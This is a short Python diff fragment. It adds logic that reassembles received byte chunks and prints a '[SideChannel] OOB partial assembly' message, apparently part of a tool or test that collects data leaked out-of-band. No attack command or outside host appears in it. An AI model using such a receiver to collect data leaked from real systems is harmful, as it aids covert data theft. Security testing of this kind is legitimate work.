+                                _max_ci = max(_received_chunks)
+                                _have_all = all(_i in _received_chunks for _i in range(_max_ci + 1))
+                                if _have_all:
+                                    _assembled = b"".join(
+                                        _received_chunks[_i] for _i in range(_max_ci + 1))
+                                    _extracted = _assembled.decode("utf-8", errors="replace")
+                                    print(f"[SideChannel]  OOB partial assembly at deadline: {_extracted[:60]}",
+                                          flush=True)
                             break  # OOB confirmed reachable, last 5s used up
                     except Exception:
                         pass
